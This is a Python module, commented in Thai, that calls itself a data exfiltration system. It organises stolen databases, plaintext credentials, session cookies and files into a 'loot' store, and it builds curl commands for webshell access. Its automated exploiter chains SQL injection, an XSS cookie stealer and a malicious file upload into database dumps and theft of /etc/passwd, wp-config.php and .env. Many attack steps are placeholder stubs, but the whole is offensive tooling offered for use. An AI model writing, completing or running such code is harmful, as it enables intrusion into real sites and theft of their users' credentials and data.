"""
Data Exfiltration System
ระบบขโมยข้อมูลและส่งกลับมายัง attacker
"""
import os
import json
import asyncio
from typing import Dict, List, Any
from pathlib import Path
import aiofiles
import hashlib
from datetime import datetime


class DataExfiltrator:
    """ระบบขโมยและจัดการข้อมูลที่ได้มา"""
    
    def __init__(self, workspace_dir: str = "/workspace"):
        self.workspace = Path(workspace_dir)
        self.loot_dir = self.workspace / "loot"
        self.loot_dir.mkdir(parents=True, exist_ok=True)
        
        # สร้าง subdirectories
        (self.loot_dir / "databases").mkdir(exist_ok=True)
        (self.loot_dir / "credentials").mkdir(exist_ok=True)
        (self.loot_dir / "files").mkdir(exist_ok=True)
        (self.loot_dir / "sessions").mkdir(exist_ok=True)
        (self.loot_dir / "shells").mkdir(exist_ok=True)
        (self.loot_dir / "screenshots").mkdir(exist_ok=True)
    
    async def exfiltrate_database(self, 
                                  target: str,
                                  db_type: str,
                                  data: bytes) -> Dict[str, Any]:
        """ขโมย database และบันทึก"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('://', '_').replace('/', '_')}_{db_type}_{timestamp}.sql"
        filepath = self.loot_dir / "databases" / filename
        
        async with aiofiles.open(filepath, 'wb') as f:
            await f.write(data)
        
        return {
            "type": "database",
            "target": target,
            "db_type": db_type,
            "file": str(filepath),
            "size": len(data),
            "hash": hashlib.sha256(data).hexdigest(),
            "timestamp": timestamp
        }
    
    async def exfiltrate_credentials(self,
                                     target: str,
                                     credentials: List[Dict[str, str]]) -> Dict[str, Any]:
        """ขโมย credentials และบันทึก"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('://', '_').replace('/', '_')}_creds_{timestamp}.json"
        filepath = self.loot_dir / "credentials" / filename
        
        data = {
            "target": target,
            "timestamp": timestamp,
            "credentials": credentials,
            "count": len(credentials)
        }
        
        async with aiofiles.open(filepath, 'w') as f:
            await f.write(json.dumps(data, indent=2))
        
        # สร้าง plaintext version สำหรับใช้งานง่าย
        txt_file = filepath.with_suffix('.txt')
        async with aiofiles.open(txt_file, 'w') as f:
            for cred in credentials:
                await f.write(f"{cred.get('username', 'N/A')}:{cred.get('password', 'N/A')}\n")
        
        return {
            "type": "credentials",
            "target": target,
            "file": str(filepath),
            "txt_file": str(txt_file),
            "count": len(credentials),
            "timestamp": timestamp
        }
    
    async def exfiltrate_session_tokens(self,
                                       target: str,
                                       tokens: List[Dict[str, str]]) -> Dict[str, Any]:
        """ขโมย session tokens และบันทึก"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('://', '_').replace('/', '_')}_sessions_{timestamp}.json"
        filepath = self.loot_dir / "sessions" / filename
        
        data = {
            "target": target,
            "timestamp": timestamp,
            "tokens": tokens,
            "count": len(tokens)
        }
        
        async with aiofiles.open(filepath, 'w') as f:
            await f.write(json.dumps(data, indent=2))
        
        return {
            "type": "session_tokens",
            "target": target,
            "file": str(filepath),
            "count": len(tokens),
            "timestamp": timestamp
        }
    
    async def exfiltrate_file(self,
                             target: str,
                             remote_path: str,
                             content: bytes) -> Dict[str, Any]:
        """ขโมยไฟล์และบันทึก"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        safe_name = remote_path.replace('/', '_').replace('\\', '_')
        filename = f"{target.replace('://', '_').replace('/', '_')}_{safe_name}_{timestamp}"
        filepath = self.loot_dir / "files" / filename
        
        async with aiofiles.open(filepath, 'wb') as f:
            await f.write(content)
        
        return {
            "type": "file",
            "target": target,
            "remote_path": remote_path,
            "file": str(filepath),
            "size": len(content),
            "hash": hashlib.sha256(content).hexdigest(),
            "timestamp": timestamp
        }
    
    async def store_webshell_info(self,
                                  target: str,
                                  shell_url: str,
                                  shell_type: str,
                                  password: str = None) -> Dict[str, Any]:
        """บันทึกข้อมูล webshell ที่ upload สำเร็จ"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{target.replace('://', '_').replace('/', '_')}_shell_{timestamp}.json"
        filepath = self.loot_dir / "shells" / filename
        
        data = {
            "target": target,
            "shell_url": shell_url,
            "shell_type": shell_type,
            "password": password,
            "timestamp": timestamp,
            "access_command": self._generate_shell_access_command(shell_url, shell_type, password)
        }
        
        async with aiofiles.open(filepath, 'w') as f:
            await f.write(json.dumps(data, indent=2))
        
        return {
            "type": "webshell",
            "target": target,
            "shell_url": shell_url,
            "shell_type": shell_type,
            "password": password,
            "file": str(filepath),
            "timestamp": timestamp
        }
    
    def _generate_shell_access_command(self, url: str, shell_type: str, password: str) -> str:
        """สร้างคำสั่งเข้าถึง webshell"""
        if shell_type == "php":
            if password:
                return f"curl -X POST {url} -d 'cmd=whoami&pass={password}'"
            return f"curl -X POST {url} -d 'cmd=whoami'"
        elif shell_type == "jsp":
            return f"curl {url}?cmd=whoami"
        elif shell_type == "aspx":
            return f"curl {url}?cmd=whoami"
        return f"curl {url}"
    
    async def create_loot_summary(self, attack_id: str, loot_items: List[Dict[str, Any]]) -> str:
        """สร้างสรุปข้อมูลที่ขโมยได้"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"loot_summary_{attack_id}_{timestamp}.json"
        filepath = self.loot_dir / filename
        
        summary = {
            "attack_id": attack_id,
            "timestamp": timestamp,
            "total_items": len(loot_items),
            "items": loot_items,
            "statistics": self._calculate_loot_stats(loot_items)
        }
        
        async with aiofiles.open(filepath, 'w') as f:
            await f.write(json.dumps(summary, indent=2))
        
        return str(filepath)
    
    def _calculate_loot_stats(self, loot_items: List[Dict[str, Any]]) -> Dict[str, int]:
        """คำนวณสถิติข้อมูลที่ขโมยได้"""
        stats = {
            "databases": 0,
            "credentials": 0,
            "session_tokens": 0,
            "files": 0,
            "webshells": 0,
            "total_credentials": 0,
            "total_sessions": 0,
            "total_size": 0
        }
        
        for item in loot_items:
            item_type = item.get("type", "")
            stats[f"{item_type}s"] = stats.get(f"{item_type}s", 0) + 1
            
            if item_type == "credentials":
                stats["total_credentials"] += item.get("count", 0)
            elif item_type == "session_tokens":
                stats["total_sessions"] += item.get("count", 0)
            
            stats["total_size"] += item.get("size", 0)
        
        return stats


class AutomatedExploiter:
    """ระบบโจมตีและใช้ประโยชน์อัตโนมัติ"""
    
    def __init__(self, exfiltrator: DataExfiltrator):
        self.exfiltrator = exfiltrator
    
    async def exploit_sql_injection(self, target: str, injection_point: str) -> Dict[str, Any]:
        """โจมตี SQL Injection และขโมยข้อมูล"""
        results = {
            "target": target,
            "injection_point": injection_point,
            "exploited": False,
            "loot": []
        }
        
        # 1. ทดสอบ SQL Injection
        if await self._test_sql_injection(target, injection_point):
            results["exploited"] = True
            
            # 2. ดึง database schema
            schema = await self._extract_database_schema(target, injection_point)
            
            # 3. ดึงข้อมูล users table
            users = await self._extract_users_table(target, injection_point)
            if users:
                cred_loot = await self.exfiltrator.exfiltrate_credentials(
                    target, users
                )
                results["loot"].append(cred_loot)
            
            # 4. Dump ทั้ง database
            db_dump = await self._dump_database(target, injection_point)
            if db_dump:
                db_loot = await self.exfiltrator.exfiltrate_database(
                    target, "mysql", db_dump
                )
                results["loot"].append(db_loot)
            
            # 5. พยายาม upload webshell
            shell = await self._upload_webshell_via_sqli(target, injection_point)
            if shell:
                shell_loot = await self.exfiltrator.store_webshell_info(
                    target, shell["url"], "php", shell.get("password")
                )
                results["loot"].append(shell_loot)
        
        return results
    
    async def _test_sql_injection(self, target: str, injection_point: str) -> bool:
        """ทดสอบว่ามี SQL Injection หรือไม่"""
        # Implementation here
        return True  # Placeholder
    
    async def _extract_database_schema(self, target: str, injection_point: str) -> Dict:
        """ดึง database schema"""
        # Implementation here
        return {}
    
    async def _extract_users_table(self, target: str, injection_point: str) -> List[Dict]:
        """ดึงข้อมูล users"""
        # Implementation here - ข้อมูลจริงจากการโจมตี
        return []
    
    async def _dump_database(self, target: str, injection_point: str) -> bytes:
        """Dump ทั้ง database"""
        # Implementation here
        return b""
    
    async def _upload_webshell_via_sqli(self, target: str, injection_point: str) -> Dict:
        """พยายาม upload webshell ผ่าน SQL Injection"""
        # Implementation here
        return None
    
    async def exploit_xss(self, target: str, xss_point: str) -> Dict[str, Any]:
        """โจมตี XSS และขโมย session tokens"""
        results = {
            "target": target,
            "xss_point": xss_point,
            "exploited": False,
            "loot": []
        }
        
        # 1. Inject XSS payload ที่ขโมย cookies
        if await self._inject_xss_cookie_stealer(target, xss_point):
            results["exploited"] = True
            
            # 2. รอรับ cookies จาก victims
            stolen_sessions = await self._collect_stolen_sessions(target)
            if stolen_sessions:
                session_loot = await self.exfiltrator.exfiltrate_session_tokens(
                    target, stolen_sessions
                )
                results["loot"].append(session_loot)
        
        return results
    
    async def _inject_xss_cookie_stealer(self, target: str, xss_point: str) -> bool:
        """Inject XSS payload ที่ขโมย cookies"""
        # Implementation here
        return True
    
    async def _collect_stolen_sessions(self, target: str) -> List[Dict]:
        """รวบรวม session tokens ที่ขโมยได้"""
        # Implementation here
        return []
    
    async def exploit_file_upload(self, target: str, upload_endpoint: str) -> Dict[str, Any]:
        """โจมตี File Upload และ upload webshell"""
        results = {
            "target": target,
            "upload_endpoint": upload_endpoint,
            "exploited": False,
            "loot": []
        }
        
        # 1. ทดสอบ file upload vulnerabilities
        if await self._test_file_upload(target, upload_endpoint):
            results["exploited"] = True
            
            # 2. Upload webshell
            shell = await self._upload_webshell(target, upload_endpoint)
            if shell:
                shell_loot = await self.exfiltrator.store_webshell_info(
                    target, shell["url"], shell["type"], shell.get("password")
                )
                results["loot"].append(shell_loot)
                
                # 3. ใช้ webshell ขโมยไฟล์สำคัญ
                important_files = await self._steal_important_files(shell["url"])
                for file_data in important_files:
                    file_loot = await self.exfiltrator.exfiltrate_file(
                        target, file_data["path"], file_data["content"]
                    )
                    results["loot"].append(file_loot)
        
        return results
    
    async def _test_file_upload(self, target: str, endpoint: str) -> bool:
        """ทดสอบ file upload vulnerability"""
        # Implementation here
        return True
    
    async def _upload_webshell(self, target: str, endpoint: str) -> Dict:
        """Upload webshell"""
        # Implementation here
        return None
    
    async def _steal_important_files(self, shell_url: str) -> List[Dict]:
        """ใช้ webshell ขโมยไฟล์สำคัญ"""
        # Implementation here - ขโมยไฟล์จริง
        important_paths = [
            "/etc/passwd",
            "/var/www/html/config.php",
            "/var/www/html/wp-config.php",
            "/.env",
            "/config/database.yml"
        ]
        return []

